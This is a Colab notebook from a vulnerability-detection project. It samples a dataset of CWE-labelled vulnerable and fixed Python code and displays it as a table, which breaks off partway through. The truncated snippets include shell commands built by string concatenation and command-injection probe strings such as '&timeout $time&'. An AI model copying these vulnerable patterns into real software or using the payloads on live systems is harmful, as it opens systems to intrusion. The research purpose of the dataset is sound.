{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4",
      "toc_visible": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "fOFWn8mIKPJE",
        "outputId": "ac47fb69-ffd5-4820-f0bb-bb4c6a4266d6"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Drive already mounted at /content/drive; to attempt to forcibly remount, call drive.mount(\"/content/drive\", force_remount=True).\n",
            "/content/drive/MyDrive/fortmp\n",
            "현재 작업 위치: /content/drive/MyDrive/fortmp\n"
          ]
        }
      ],
      "source": [
        "# 1. 구글 드라이브 마운트\n",
        "from google.colab import drive\n",
        "drive.mount('/content/drive')\n",
        "\n",
        "# 2. 작업 폴더 생성 및 이동 (VUDENC 프로젝트를 저장할 위치)\n",
        "# 경로에 본인의 구글 드라이브 ID나 원하는 폴더명을 넣으셔도 됩니다.\n",
        "import os\n",
        "workspace_path = '/content/drive/MyDrive/fortmp/'\n",
        "os.makedirs(workspace_path, exist_ok=True)\n",
        "%cd {workspace_path}\n",
        "\n",
        "print(f\"현재 작업 위치: {os.getcwd()}\")"
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import pandas as pd\n",
        "import numpy as np"
      ],
      "metadata": {
        "id": "GIlnINwFv0hV"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# 35개 샘플 기준으로 수행"
      ],
      "metadata": {
        "id": "K7TMkuNRQIZT"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "df = pd.read_csv('CWE_vulset_noNaN.csv')\n",
        "df_sample = df.groupby('CWE').head(5).reset_index(drop=True)\n",
        "df_sample"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 1000
        },
        "id": "o9BkSD4ZKXFQ",
        "outputId": "5379738f-efbd-42e6-f706-730e675ec40b"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "                                         sha  keyword      CWE  \\\n",
              "0   9b7805119938343fcac9dc929d8882f1d97cf14a   remote   CWE-94   \n",
              "1   9b7805119938343fcac9dc929d8882f1d97cf14a   remote   CWE-94   \n",
              "2   9b7805119938343fcac9dc929d8882f1d97cf14a   remote   CWE-94   \n",
              "3   9b7805119938343fcac9dc929d8882f1d97cf14a   remote   CWE-94   \n",
              "4   269b8c87afc149911af3ae63b3ccbfc77ffb223d   remote   CWE-94   \n",
              "5   c5abced949e6a4b001d1dee321593e74ecadecfe     path  CWE-538   \n",
              "6   902b59452c3b1c879f3196fd90226a58e2fd074a     path  CWE-538   \n",
              "7   923ba361d8f757f0656cfd216525aca4848e02aa     path  CWE-538   \n",
              "8   923ba361d8f757f0656cfd216525aca4848e02aa     path  CWE-538   \n",
              "9   923ba361d8f757f0656cfd216525aca4848e02aa     path  CWE-538   \n",
              "10  66d3662986469f543f95324aaf2868465de2bd24      sql   CWE-89   \n",
              "11  66d3662986469f543f95324aaf2868465de2bd24      sql   CWE-89   \n",
              "12  dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a      sql   CWE-89   \n",
              "13  dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a      sql   CWE-89   \n",
              "14  dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a      sql   CWE-89   \n",
              "15  4a7915860cc482cb426cbf371ae785bfbae71881  command   CWE-77   \n",
              "16  0b6a04db6eb2f90acaec5970dcca4bd283e6e74b  command   CWE-77   \n",
              "17  0b6a04db6eb2f90acaec5970dcca4bd283e6e74b  command   CWE-77   \n",
              "18  0b6a04db6eb2f90acaec5970dcca4bd283e6e74b  command   CWE-77   \n",
              "19  0b6a04db6eb2f90acaec5970dcca4bd283e6e74b  command   CWE-77   \n",
              "20  351a3ccd8dd6944ebeb0faf902c9de5f21be43b6      XSS   CWE-79   \n",
              "21  351a3ccd8dd6944ebeb0faf902c9de5f21be43b6      XSS   CWE-79   \n",
              "22  c7435cdd6357bed9fa1859782a70ad6a7a71125d      XSS   CWE-79   \n",
              "23  c7435cdd6357bed9fa1859782a70ad6a7a71125d      XSS   CWE-79   \n",
              "24  0ba0637b662761acf042636097913f8fb84df4c7      XSS   CWE-79   \n",
              "25  59fdbf02dac752fd22cb87eb4bea59d599b333dd     XSRF  CWE-352   \n",
              "26  398ed11584313a371763240392c4dda1cf986deb     XSRF  CWE-352   \n",
              "27  398ed11584313a371763240392c4dda1cf986deb     XSRF  CWE-352   \n",
              "28  44056ceb78bcf2e85077193e38c04166ff4a59fb     XSRF  CWE-352   \n",
              "29  1a6a1dd6540b0b1441d270e9ea62f9a8c0c6e1bf     XSRF  CWE-352   \n",
              "30  a1f948b468b6621083a03b0d53432341b7a4d753     open  CWE-601   \n",
              "31  a1f948b468b6621083a03b0d53432341b7a4d753     open  CWE-601   \n",
              "32  a1f948b468b6621083a03b0d53432341b7a4d753     open  CWE-601   \n",
              "33  a1f948b468b6621083a03b0d53432341b7a4d753     open  CWE-601   \n",
              "34  a1f948b468b6621083a03b0d53432341b7a4d753     open  CWE-601   \n",
              "\n",
              "                                            goodparts  \\\n",
              "0   ['import common, sqlite3, subprocess, NetworkM...   \n",
              "1   [\"    subprocess.call(['useradd','-G','docker,...   \n",
              "2   ['import common, sqlite3, subprocess, NetworkM...   \n",
              "3   [\"    subprocess.call(['useradd','-G','docker,...   \n",
              "4   ['        if self.run_on_localhost(comp):', ' ...   \n",
              "5   ['        \"\"\"Test whether self.path correspond...   \n",
              "6   ['        \"\"\"Test whether self.path correspond...   \n",
              "7   ['        \"\"\"Test whether self.path correspond...   \n",
              "8   ['        \"\"\"Test whether self.path correspond...   \n",
              "9   ['        \"\"\"Test whether self.path correspond...   \n",
              "10                    ['    WHERE parent_id IN (%s)']   \n",
              "11  ['        cursor.execute(SQL_RECURSIVE_QUERY_E...   \n",
              "12  [\"        query = '''SELECT mapped_by as contr...   \n",
              "13              ['from sqlalchemy import desc, text']   \n",
              "14  ['        sql = \"select * from users where id ...   \n",
              "15  ['    splits = [', \"        ' ',\", \"        '\\...   \n",
              "16                             ['version = \"1.0.10\"']   \n",
              "17  ['        resp_start = self._helpers.bytesToSt...   \n",
              "18  ['            \\'any\\': [\\'\"&ping -n $time loca...   \n",
              "19  ['            if (self._attack(basePair, inser...   \n",
              "20  [\"        if 'application/json' or 'text/plain...   \n",
              "21  ['                    if xss_request_url.text....   \n",
              "22  [\"        if 'application/json' or 'text/plain...   \n",
              "23  ['                    if xss_request_url.text....   \n",
              "24  [\"        if 'application/json' or 'text/plain...   \n",
              "25  [\"proto_pattern = r'\\\\\\\\nFuzzer: (?:afl|libFuz...   \n",
              "26  ['from files.discovered import VULN_LIST, FORM...   \n",
              "27  [\"        config.HEADER_VALUES[m.split('=')[0]...   \n",
              "28  ['        if not bytes_eq(self.xsrf_token, tok...   \n",
              "29          [\"            self.clear_cookie('user')\"]   \n",
              "30         ['from django.utils._os import safe_join']   \n",
              "31  [\"    path = posixpath.normpath(path).lstrip('...   \n",
              "32         ['from django.utils._os import safe_join']   \n",
              "33  [\"    path = posixpath.normpath(path).lstrip('...   \n",
              "34         ['from django.utils._os import safe_join']   \n",
              "\n",
              "                                             badparts  \\\n",
              "0   ['import common, sqlite3, subprocess, NetworkM...   \n",
              "1   ['    os.system(\"useradd -G docker,wheel -p \"+...   \n",
              "2   ['import common, sqlite3, subprocess, NetworkM...   \n",
              "3   ['    os.system(\"useradd -G docker,wheel -p \"+...   \n",
              "4   ['        return check_component(comp, self.se...   \n",
              "5   ['        \"\"\"Test whether self.path correspond...   \n",
              "6   ['        \"\"\"Test whether self.path correspond...   \n",
              "7   ['        \"\"\"Test whether self.path correspond...   \n",
              "8   ['        \"\"\"Test whether self.path correspond...   \n",
              "9   ['        \"\"\"Test whether self.path correspond...   \n",
              "10       ['    WHERE parent_id IN ({list_root_ids})']   \n",
              "11  [\"        query = SQL_RECURSIVE_QUERY_EDUCATIO...   \n",
              "12  [\"        query = '''SELECT mapped_by as contr...   \n",
              "13                    ['from sqlalchemy import desc']   \n",
              "14  ['        sql = \"select * from users where id ...   \n",
              "15  ['    @staticmethod', '    def test(self):', '...   \n",
              "16                              ['version = \"1.0.9\"']   \n",
              "17  ['        resp_start = self._helpers.bytesToSt...   \n",
              "18  ['            \\'any\\': [\\'\"&timeout $time&\\\\\\'...   \n",
              "19  ['            if (self._attack(basePair, inser...   \n",
              "20  [\"        if 'application/json' or 'text/plain...   \n",
              "21  ['                    logs.logging.info(\"%s is...   \n",
              "22  [\"        if 'application/json' or 'text/plain...   \n",
              "23  ['                    logs.logging.info(\"%s is...   \n",
              "24  [\"        if 'application/json' or 'text/plain...   \n",
              "25  [\"proto_pattern = r'\\\\bFuzzer: (?:afl|libFuzze...   \n",
              "26  ['from files.discovered import VULN_LIST, FORM...   \n",
              "27  [\"        config.HEADER_VALUES[m.split('=')[0]...   \n",
              "28           ['        if self.xsrf_token != token:']   \n",
              "29           ['            self.clear_all_cookies()']   \n",
              "30                      ['    HttpResponseRedirect,']   \n",
              "31  ['    path = posixpath.normpath(path)', \"    p...   \n",
              "32                      ['    HttpResponseRedirect,']   \n",
              "33  ['    path = posixpath.normpath(path)', \"    p...   \n",
              "34                      ['    HttpResponseRedirect,']   \n",
              "\n",
              "                                               source  \\\n",
              "0   \\nfrom django.shortcuts import render from dja...   \n",
              "1   \\nfrom django.shortcuts import render from dja...   \n",
              "2   \\nfrom django.shortcuts import render from dja...   \n",
              "3   \\nfrom django.shortcuts import render from dja...   \n",
              "4   \\n\\nfrom libtmux import Server from yaml impor...   \n",
              "5   \\n\"\"\"CGI-savvy HTTP Server. This module builds...   \n",
              "6   \\n\"\"\"CGI-savvy HTTP Server. This module builds...   \n",
              "7   \\n\"\"\"CGI-savvy HTTP Server. This module builds...   \n",
              "8   \\n\"\"\"CGI-savvy HTTP Server. This module builds...   \n",
              "9   \\n\"\"\"CGI-savvy HTTP Server. This module builds...   \n",
              "10  \\n import itertools from django.core.exception...   \n",
              "11  \\n import itertools from django.core.exception...   \n",
              "12  \\nfrom server import db from flask import curr...   \n",
              "13  \\nimport geojson import datetime import dateut...   \n",
              "14  \\nimport geojson import datetime import dateut...   \n",
              "15  \\n from saker.fuzzers.fuzzer import Fuzzer cla...   \n",
              "16  \\n try: import pickle import random import re ...   \n",
              "17  \\n try: import pickle import random import re ...   \n",
              "18  \\n try: import pickle import random import re ...   \n",
              "19  \\n try: import pickle import random import re ...   \n",
              "20  \\nimport os import urlparse import sendrequest...   \n",
              "21  \\nimport os import urlparse import sendrequest...   \n",
              "22  \\nimport os import urlparse import sendrequest...   \n",
              "23  \\nimport os import urlparse import sendrequest...   \n",
              "24  \\nimport os import urlparse import sendrequest...   \n",
              "25  \\n\\nimport argparse import glob import logging...   \n",
              "26  \\n import os from core.colors import * from fi...   \n",
              "27  \\n import argparse, sys, tld import urllib.par...   \n",
              "28  \\n import httplib import types import collecti...   \n",
              "29  \\nimport os from pathlib import Path from date...   \n",
              "30  \\n\"\"\" Views and functions for serving static f...   \n",
              "31  \\n\"\"\" Views and functions for serving static f...   \n",
              "32  \\n\"\"\" Views and functions for serving static f...   \n",
              "33  \\n\"\"\" Views and functions for serving static f...   \n",
              "34  \\n\"\"\" Views and functions for serving static f...   \n",
              "\n",
              "                                   sourceWithComments  \n",
              "0   from django.shortcuts import render\\nfrom djan...  \n",
              "1   from django.shortcuts import render\\nfrom djan...  \n",
              "2   from django.shortcuts import render\\nfrom djan...  \n",
              "3   from django.shortcuts import render\\nfrom djan...  \n",
              "4   #! /usr/bin/env python\\nfrom libtmux import Se...  \n",
              "5   \"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...  \n",
              "6   \"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...  \n",
              "7   \"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...  \n",
              "8   \"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...  \n",
              "9   \"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...  \n",
              "10  ##############################################...  \n",
              "11  ##############################################...  \n",
              "12  from server import db\\nfrom flask import curre...  \n",
              "13  import geojson\\nimport datetime\\nimport dateut...  \n",
              "14  import geojson\\nimport datetime\\nimport dateut...  \n",
              "15  #!/usr/bin/env python\\n# -*- coding: utf-8 -*-...  \n",
              "16  # Author: James Kettle <albinowax+acz@gmail.co...  \n",
              "17  # Author: James Kettle <albinowax+acz@gmail.co...  \n",
              "18  # Author: James Kettle <albinowax+acz@gmail.co...  \n",
              "19  # Author: James Kettle <albinowax+acz@gmail.co...  \n",
              "20  import os\\nimport urlparse\\nimport sendrequest...  \n",
              "21  import os\\nimport urlparse\\nimport sendrequest...  \n",
              "22  import os\\nimport urlparse\\nimport sendrequest...  \n",
              "23  import os\\nimport urlparse\\nimport sendrequest...  \n",
              "24  import os\\nimport urlparse\\nimport sendrequest...  \n",
              "25  #!/usr/bin/env python3\\nimport argparse\\nimpor...  \n",
              "26  #!/usr/bin/env python3\\n# -*- coding: utf-8 -*...  \n",
              "27  #!/usr/bin/env python3\\n# -*- coding: utf-8 -*...  \n",
              "28  # -*- encoding: utf-8 -*-\\n#\\n#  base\\n#  ****...  \n",
              "29  import os\\nfrom pathlib import Path\\nfrom date...  \n",
              "30  \"\"\"\\nViews and functions for serving static fi...  \n",
              "31  \"\"\"\\nViews and functions for serving static fi...  \n",
              "32  \"\"\"\\nViews and functions for serving static fi...  \n",
              "33  \"\"\"\\nViews and functions for serving static fi...  \n",
              "34  \"\"\"\\nViews and functions for serving static fi...  "
            ],
            "text/html": [
              "\n",
              "  <div id=\"df-95400f9a-6f2d-40ca-98c3-f718f8014391\" class=\"colab-df-container\">\n",
              "    <div>\n",
              "<style scoped>\n",
              "    .dataframe tbody tr th:only-of-type {\n",
              "        vertical-align: middle;\n",
              "    }\n",
              "\n",
              "    .dataframe tbody tr th {\n",
              "        vertical-align: top;\n",
              "    }\n",
              "\n",
              "    .dataframe thead th {\n",
              "        text-align: right;\n",
              "    }\n",
              "</style>\n",
              "<table border=\"1\" class=\"dataframe\">\n",
              "  <thead>\n",
              "    <tr style=\"text-align: right;\">\n",
              "      <th></th>\n",
              "      <th>sha</th>\n",
              "      <th>keyword</th>\n",
              "      <th>CWE</th>\n",
              "      <th>goodparts</th>\n",
              "      <th>badparts</th>\n",
              "      <th>source</th>\n",
              "      <th>sourceWithComments</th>\n",
              "    </tr>\n",
              "  </thead>\n",
              "  <tbody>\n",
              "    <tr>\n",
              "      <th>0</th>\n",
              "      <td>9b7805119938343fcac9dc929d8882f1d97cf14a</td>\n",
              "      <td>remote</td>\n",
              "      <td>CWE-94</td>\n",
              "      <td>['import common, sqlite3, subprocess, NetworkM...</td>\n",
              "      <td>['import common, sqlite3, subprocess, NetworkM...</td>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>from django.shortcuts import render\\nfrom djan...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>1</th>\n",
              "      <td>9b7805119938343fcac9dc929d8882f1d97cf14a</td>\n",
              "      <td>remote</td>\n",
              "      <td>CWE-94</td>\n",
              "      <td>[\"    subprocess.call(['useradd','-G','docker,...</td>\n",
              "      <td>['    os.system(\"useradd -G docker,wheel -p \"+...</td>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>from django.shortcuts import render\\nfrom djan...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>2</th>\n",
              "      <td>9b7805119938343fcac9dc929d8882f1d97cf14a</td>\n",
              "      <td>remote</td>\n",
              "      <td>CWE-94</td>\n",
              "      <td>['import common, sqlite3, subprocess, NetworkM...</td>\n",
              "      <td>['import common, sqlite3, subprocess, NetworkM...</td>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>from django.shortcuts import render\\nfrom djan...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>3</th>\n",
              "      <td>9b7805119938343fcac9dc929d8882f1d97cf14a</td>\n",
              "      <td>remote</td>\n",
              "      <td>CWE-94</td>\n",
              "      <td>[\"    subprocess.call(['useradd','-G','docker,...</td>\n",
              "      <td>['    os.system(\"useradd -G docker,wheel -p \"+...</td>\n",
              "      <td>\\nfrom django.shortcuts import render from dja...</td>\n",
              "      <td>from django.shortcuts import render\\nfrom djan...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>4</th>\n",
              "      <td>269b8c87afc149911af3ae63b3ccbfc77ffb223d</td>\n",
              "      <td>remote</td>\n",
              "      <td>CWE-94</td>\n",
              "      <td>['        if self.run_on_localhost(comp):', ' ...</td>\n",
              "      <td>['        return check_component(comp, self.se...</td>\n",
              "      <td>\\n\\nfrom libtmux import Server from yaml impor...</td>\n",
              "      <td>#! /usr/bin/env python\\nfrom libtmux import Se...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>5</th>\n",
              "      <td>c5abced949e6a4b001d1dee321593e74ecadecfe</td>\n",
              "      <td>path</td>\n",
              "      <td>CWE-538</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>\\n\"\"\"CGI-savvy HTTP Server. This module builds...</td>\n",
              "      <td>\"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>6</th>\n",
              "      <td>902b59452c3b1c879f3196fd90226a58e2fd074a</td>\n",
              "      <td>path</td>\n",
              "      <td>CWE-538</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>\\n\"\"\"CGI-savvy HTTP Server. This module builds...</td>\n",
              "      <td>\"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>7</th>\n",
              "      <td>923ba361d8f757f0656cfd216525aca4848e02aa</td>\n",
              "      <td>path</td>\n",
              "      <td>CWE-538</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>\\n\"\"\"CGI-savvy HTTP Server. This module builds...</td>\n",
              "      <td>\"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>8</th>\n",
              "      <td>923ba361d8f757f0656cfd216525aca4848e02aa</td>\n",
              "      <td>path</td>\n",
              "      <td>CWE-538</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>\\n\"\"\"CGI-savvy HTTP Server. This module builds...</td>\n",
              "      <td>\"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>9</th>\n",
              "      <td>923ba361d8f757f0656cfd216525aca4848e02aa</td>\n",
              "      <td>path</td>\n",
              "      <td>CWE-538</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>['        \"\"\"Test whether self.path correspond...</td>\n",
              "      <td>\\n\"\"\"CGI-savvy HTTP Server. This module builds...</td>\n",
              "      <td>\"\"\"CGI-savvy HTTP Server.\\n\\nThis module build...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>10</th>\n",
              "      <td>66d3662986469f543f95324aaf2868465de2bd24</td>\n",
              "      <td>sql</td>\n",
              "      <td>CWE-89</td>\n",
              "      <td>['    WHERE parent_id IN (%s)']</td>\n",
              "      <td>['    WHERE parent_id IN ({list_root_ids})']</td>\n",
              "      <td>\\n import itertools from django.core.exception...</td>\n",
              "      <td>##############################################...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>11</th>\n",
              "      <td>66d3662986469f543f95324aaf2868465de2bd24</td>\n",
              "      <td>sql</td>\n",
              "      <td>CWE-89</td>\n",
              "      <td>['        cursor.execute(SQL_RECURSIVE_QUERY_E...</td>\n",
              "      <td>[\"        query = SQL_RECURSIVE_QUERY_EDUCATIO...</td>\n",
              "      <td>\\n import itertools from django.core.exception...</td>\n",
              "      <td>##############################################...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>12</th>\n",
              "      <td>dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a</td>\n",
              "      <td>sql</td>\n",
              "      <td>CWE-89</td>\n",
              "      <td>[\"        query = '''SELECT mapped_by as contr...</td>\n",
              "      <td>[\"        query = '''SELECT mapped_by as contr...</td>\n",
              "      <td>\\nfrom server import db from flask import curr...</td>\n",
              "      <td>from server import db\\nfrom flask import curre...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>13</th>\n",
              "      <td>dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a</td>\n",
              "      <td>sql</td>\n",
              "      <td>CWE-89</td>\n",
              "      <td>['from sqlalchemy import desc, text']</td>\n",
              "      <td>['from sqlalchemy import desc']</td>\n",
              "      <td>\\nimport geojson import datetime import dateut...</td>\n",
              "      <td>import geojson\\nimport datetime\\nimport dateut...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>14</th>\n",
              "      <td>dee040a2d22b3c4d5e38e2dbf8c6b651ad4c241a</td>\n",
              "      <td>sql</td>\n",
              "      <td>CWE-89</td>\n",
              "      <td>['        sql = \"select * from users where id ...</td>\n",
              "      <td>['        sql = \"select * from users where id ...</td>\n",
              "      <td>\\nimport geojson import datetime import dateut...</td>\n",
              "      <td>import geojson\\nimport datetime\\nimport dateut...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>15</th>\n",
              "      <td>4a7915860cc482cb426cbf371ae785bfbae71881</td>\n",
              "      <td>command</td>\n",
              "      <td>CWE-77</td>\n",
              "      <td>['    splits = [', \"        ' ',\", \"        '\\...</td>\n",
              "      <td>['    @staticmethod', '    def test(self):', '...</td>\n",
              "      <td>\\n from saker.fuzzers.fuzzer import Fuzzer cla...</td>\n",
              "      <td>#!/usr/bin/env python\\n# -*- coding: utf-8 -*-...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>16</th>\n",
              "      <td>0b6a04db6eb2f90acaec5970dcca4bd283e6e74b</td>\n",
              "      <td>command</td>\n",
              "      <td>CWE-77</td>\n",
              "      <td>['version = \"1.0.10\"']</td>\n",
              "      <td>['version = \"1.0.9\"']</td>\n",
              "      <td>\\n try: import pickle import random import re ...</td>\n",
              "      <td># Author: James Kettle &lt;albinowax+acz@gmail.co...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>17</th>\n",
              "      <td>0b6a04db6eb2f90acaec5970dcca4bd283e6e74b</td>\n",
              "      <td>command</td>\n",
              "      <td>CWE-77</td>\n",
              "      <td>['        resp_start = self._helpers.bytesToSt...</td>\n",
              "      <td>['        resp_start = self._helpers.bytesToSt...</td>\n",
              "      <td>\\n try: import pickle import random import re ...</td>\n",
              "      <td># Author: James Kettle &lt;albinowax+acz@gmail.co...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>18</th>\n",
              "      <td>0b6a04db6eb2f90acaec5970dcca4bd283e6e74b</td>\n",
              "      <td>command</td>\n",
              "      <td>CWE-77</td>\n",
              "      <td>['            \\'any\\': [\\'\"&amp;ping -n $time loca...</td>\n",
              "      <td>['            \\'any\\': [\\'\"&amp;timeout $time&amp;\\\\\\'...</td>\n",
              "      <td>\\n try: import pickle import random import re ...</td>\n",
              "      <td># Author: James Kettle &lt;albinowax+acz@gmail.co...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>19</th>\n",
              "      <td>0b6a04db6eb2f90acaec5970dcca4bd283e6e74b</td>\n",
              "      <td>command</td>\n",
              "      <td>CWE-77</td>\n",
              "      <td>['            if (self._attack(basePair, inser...</td>\n",
              "      <td>['            if (self._attack(basePair, inser...</td>\n",
              "      <td>\\n try: import pickle import random import re ...</td>\n",
              "      <td># Author: James Kettle &lt;albinowax+acz@gmail.co...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>20</th>\n",
              "      <td>351a3ccd8dd6944ebeb0faf902c9de5f21be43b6</td>\n",
              "      <td>XSS</td>\n",
              "      <td>CWE-79</td>\n",
              "      <td>[\"        if 'application/json' or 'text/plain...</td>\n",
              "      <td>[\"        if 'application/json' or 'text/plain...</td>\n",
              "      <td>\\nimport os import urlparse import sendrequest...</td>\n",
              "      <td>import os\\nimport urlparse\\nimport sendrequest...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>21</th>\n",
              "      <td>351a3ccd8dd6944ebeb0faf902c9de5f21be43b6</td>\n",
              "      <td>XSS</td>\n",
              "      <td>CWE-79</td>\n",
              "      <td>['                    if xss_request_url.text....</td>\n",
              "      <td>['                    logs.logging.info(\"%s is...</td>\n",
              "      <td>\\nimport os import urlparse import sendrequest...</td>\n",
              "      <td>import os\\nimport urlparse\\nimport sendrequest...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>22</th>\n",
              "      <td>c7435cdd6357bed9fa1859782a70ad6a7a71125d</td>\n",
              "      <td>XSS</td>\n",
              "      <td>CWE-79</td>\n",
              "      <td>[\"        if 'application/json' or 'text/plain...</td>\n",
              "      <td>[\"        if 'application/json' or 'text/plain...</td>\n",
              "      <td>\\nimport os import urlparse import sendrequest...</td>\n",
              "      <td>import os\\nimport urlparse\\nimport sendrequest...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>23</th>\n",
              "      <td>c7435cdd6357bed9fa1859782a70ad6a7a71125d</td>\n",
              "      <td>XSS</td>\n",
              "      <td>CWE-79</td>\n",
              "      <td>['                    if xss_request_url.text....</td>\n",
              "      <td>['                    logs.logging.info(\"%s is...</td>\n",
              "      <td>\\nimport os import urlparse import sendrequest...</td>\n",
              "      <td>import os\\nimport urlparse\\nimport sendrequest...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>24</th>\n",
              "      <td>0ba0637b662761acf042636097913f8fb84df4c7</td>\n",
              "      <td>XSS</td>\n",
              "      <td>CWE-79</td>\n",
              "      <td>[\"        if 'application/json' or 'text/plain...</td>\n",
              "      <td>[\"        if 'application/json' or 'text/plain...</td>\n",
              "      <td>\\nimport os import urlparse import sendrequest...</td>\n",
              "      <td>import os\\nimport urlparse\\nimport sendrequest...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>25</th>\n",
              "      <td>59fdbf02dac752fd22cb87eb4bea59d599b333dd</td>\n",
              "      <td>XSRF</td>\n",
              "      <td>CWE-352</td>\n",
              "      <td>[\"proto_pattern = r'\\\\\\\\nFuzzer: (?:afl|libFuz...</td>\n",
              "      <td>[\"proto_pattern = r'\\\\bFuzzer: (?:afl|libFuzze...</td>\n",
              "      <td>\\n\\nimport argparse import glob import logging...</td>\n",
              "      <td>#!/usr/bin/env python3\\nimport argparse\\nimpor...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>26</th>\n",
              "      <td>398ed11584313a371763240392c4dda1cf986deb</td>\n",
              "      <td>XSRF</td>\n",
              "      <td>CWE-352</td>\n",
              "      <td>['from files.discovered import VULN_LIST, FORM...</td>\n",
              "      <td>['from files.discovered import VULN_LIST, FORM...</td>\n",
              "      <td>\\n import os from core.colors import * from fi...</td>\n",
              "      <td>#!/usr/bin/env python3\\n# -*- coding: utf-8 -*...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>27</th>\n",
              "      <td>398ed11584313a371763240392c4dda1cf986deb</td>\n",
              "      <td>XSRF</td>\n",
              "      <td>CWE-352</td>\n",
              "      <td>[\"        config.HEADER_VALUES[m.split('=')[0]...</td>\n",
              "      <td>[\"        config.HEADER_VALUES[m.split('=')[0]...</td>\n",
              "      <td>\\n import argparse, sys, tld import urllib.par...</td>\n",
              "      <td>#!/usr/bin/env python3\\n# -*- coding: utf-8 -*...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>28</th>\n",
              "      <td>44056ceb78bcf2e85077193e38c04166ff4a59fb</td>\n",
              "      <td>XSRF</td>\n",
              "      <td>CWE-352</td>\n",
              "      <td>['        if not bytes_eq(self.xsrf_token, tok...</td>\n",
              "      <td>['        if self.xsrf_token != token:']</td>\n",
              "      <td>\\n import httplib import types import collecti...</td>\n",
              "      <td># -*- encoding: utf-8 -*-\\n#\\n#  base\\n#  ****...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>29</th>\n",
              "      <td>1a6a1dd6540b0b1441d270e9ea62f9a8c0c6e1bf</td>\n",
              "      <td>XSRF</td>\n",
              "      <td>CWE-352</td>\n",
              "      <td>[\"            self.clear_cookie('user')\"]</td>\n",
              "      <td>['            self.clear_all_cookies()']</td>\n",
              "      <td>\\nimport os from pathlib import Path from date...</td>\n",
              "      <td>import os\\nfrom pathlib import Path\\nfrom date...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
              "      <th>30</th>\n",
              "      <td>a1f948b468b6621083a03b0d53432341b7a4d753</td>\n",
              "      <td>open</td>\n",
              "      <td>CWE-601</td>\n",
              "      <td>['from django.utils._os import safe_join']</td>\n",
              "      <td>['    HttpResponseRedirect,']</td>\n",
              "      <td>\\n\"\"\" Views and functions for serving static f...</td>\n",
              "      <td>\"\"\"\\nViews and functions for serving static fi...</td>\n",
              "    </tr>\n",
              "    <tr>\n",
